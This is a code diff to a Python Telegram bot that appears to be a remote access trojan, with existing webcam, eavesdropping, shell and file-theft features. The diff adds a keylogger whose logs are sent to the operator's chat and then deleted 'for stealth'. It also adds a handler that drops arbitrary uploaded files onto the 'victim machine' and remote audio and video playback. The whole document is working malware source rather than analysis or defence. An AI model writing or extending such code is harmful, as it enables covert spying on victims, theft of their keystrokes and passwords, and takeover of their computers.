@@ -8,9 +8,10 @@ import logging
 # Updated imports for v20+
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.constants import ParseMode
-from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
 from telegram.request import HTTPXRequest
 
+import time
 import flag
 import pyperclip
 from Modules import (
@@ -24,6 +25,8 @@ from Modules import (
     show_popup,
     wifi_scanner,
     open_website,
+    media_player,
+    keylogger,
 )
 
 # Configuration
@@ -50,6 +53,8 @@ async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("📷 Get Pic From Webcam", callback_data="get_Webcam")],
         [InlineKeyboardButton("👂 Start Eavesdrop", callback_data="start_eavesdrop")],
         [InlineKeyboardButton("🛑 Stop Eavesdrop", callback_data="stop_eavesdrop")],
+        [InlineKeyboardButton("⌨️ Start Keylog", callback_data="start_keylog")],
+        [InlineKeyboardButton("🛑 Stop Keylog", callback_data="stop_keylog")],
         [InlineKeyboardButton("🗣️ Text To Speech on client", callback_data="speak")],
         [InlineKeyboardButton("🖥️ Get System Information", callback_data="get_system_info")],
         [InlineKeyboardButton("🔑 Perform Shell Commands", callback_data="shell_commands")],
@@ -156,6 +161,114 @@ async def get_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
          await update.message.reply_text("⚠️ Usage: /get_file <path>")
 
 
+async def play_audio_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    inputs = (update.message.text).split()
+    if len(inputs) > 1:
+        file_path = listToString(inputs[1:])
+        result = media_player.play_audio(file_path)
+        await update.message.reply_text(f"🎵 {result}")
+    else:
+        await update.message.reply_text("⚠️ Usage: /playaudio <path>")
+
+
+async def play_video_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    inputs = (update.message.text).split()
+    if len(inputs) > 1:
+        file_path = listToString(inputs[1:])
+        result = media_player.play_video(file_path)
+        await update.message.reply_text(f"🎬 {result}")
+    else:
+        await update.message.reply_text("⚠️ Usage: /playvideo <path>")
+
+
+async def start_keylog_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    msg = keylogger.start_logging()
+    await update.message.reply_text(f"⌨️ {msg}")
+
+async def stop_keylog_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    msg = keylogger.stop_logging()
+    await update.message.reply_text(f"🛑 {msg} Sending log file...")
+    if os.path.exists("keylog.txt"):
+        try:
+            await context.bot.send_document(
+                chat_id=CHAT_ID,
+                caption=USERNAME + "'s Keylogs",
+                document=open("keylog.txt", "rb"),
+            )
+            os.remove("keylog.txt")
+        except Exception as e:
+                await update.message.reply_text(f"❌ Error sending log: {e}")
+    else:
+        await update.message.reply_text("❌ No keylog file found.")
+
+
+async def upload_file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Handles file uploads from the user to the victim machine.
+    Supports Documents, Audio, Video, and Photos.
+    """
+    message = update.message
+    if not message:
+        return
+
+    print(f"Received message with ID: {message.message_id}") # Debug log
+
+    file_obj = None
+    file_name = None
+
+    # Determine file type and get the file object
+    if message.document:
+        file_obj = message.document
+        file_name = file_obj.file_name
+        print("Detected Document")
+    elif message.audio:
+        file_obj = message.audio
+        file_name = file_obj.file_name or "audio.mp3"
+        print("Detected Audio")
+    elif message.video:
+        file_obj = message.video
+        file_name = file_obj.file_name or "video.mp4"
+        print("Detected Video")
+    elif message.photo:
+        file_obj = message.photo[-1] # Get highest resolution
+        file_name = f"photo_{int(time.time())}.jpg"
+        print("Detected Photo")
+    
+    if not file_obj:
+        print("No file object found in message.")
+        return
+
+    caption = message.caption
+    
+    # Determine destination path
+    if caption:
+        if os.path.isdir(caption):
+            save_path = os.path.join(caption, file_name)
+        elif caption.endswith(os.path.sep) or caption.endswith('/'):
+             if not os.path.exists(caption):
+                 try:
+                     os.makedirs(caption)
+                 except:
+                     pass
+             save_path = os.path.join(caption, file_name)
+        else:
+            save_path = caption
+    else:
+        save_path = file_name
+
+    # Ensure save_path is absolute for clarity
+    save_path = os.path.abspath(save_path)
+    print(f"Saving to: {save_path}")
+
+    try:
+        new_file = await file_obj.get_file()
+        await new_file.download_to_drive(custom_path=save_path)
+        await update.message.reply_text(f"✅ File saved to: {save_path}")
+    except Exception as e:
+        print(f"Error saving file: {e}")
+        await update.message.reply_text(f"❌ Error saving file: {e}")
+
+
 async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer() 
@@ -239,6 +352,29 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             os.remove("audio_record.wav")
         else:
              await context.bot.send_message(chat_id=CHAT_ID, text="❌ Audio file not found.")
+
+    elif result == "start_keylog":
+        msg = keylogger.start_logging()
+        await context.bot.send_message(chat_id=CHAT_ID, text=f"⌨️ {msg}")
+
+    elif result == "stop_keylog":
+        msg = keylogger.stop_logging()
+        await context.bot.send_message(chat_id=CHAT_ID, text=f"🛑 {msg} Sending log file...")
+        if os.path.exists("keylog.txt"):
+            try:
+                await context.bot.send_document(
+                    chat_id=CHAT_ID,
+                    caption=USERNAME + "'s Keylogs",
+                    document=open("keylog.txt", "rb"),
+                )
+                # Optional: Delete after sending? User didn't specify, but usually good practice.
+                # Let's keep it for now or maybe clear it on next start.
+                # For safety/stealth, maybe delete.
+                os.remove("keylog.txt") 
+            except Exception as e:
+                 await context.bot.send_message(chat_id=CHAT_ID, text=f"❌ Error sending log: {e}")
+        else:
+            await context.bot.send_message(chat_id=CHAT_ID, text="❌ No keylog file found.")
 
     elif result == "shell_commands":
         await context.bot.send_message(
@@ -327,7 +463,21 @@ if __name__ == '__main__':
     application.add_handler(CommandHandler("shell", shell_commands))
     application.add_handler(CommandHandler("open_website", open_websites))
     application.add_handler(CommandHandler("get_file", get_file))
+    application.add_handler(CommandHandler("playaudio", play_audio_command))
+    application.add_handler(CommandHandler("playvideo", play_video_command))
+    application.add_handler(CommandHandler("startkeylog", start_keylog_command))
+    application.add_handler(CommandHandler("stopkeylog", stop_keylog_command))
     application.add_handler(CommandHandler("commands", main_menu))
+    
+    # Handler for file uploads (Documents, Audio, Video, Photos)
+    # We use a combined filter to catch all these types
+    upload_filter = (
+        filters.Document.ALL | 
+        filters.AUDIO | 
+        filters.VIDEO | 
+        filters.PHOTO
+    )
+    application.add_handler(MessageHandler(upload_filter, upload_file_handler))
 
     application.add_handler(CallbackQueryHandler(button))
 
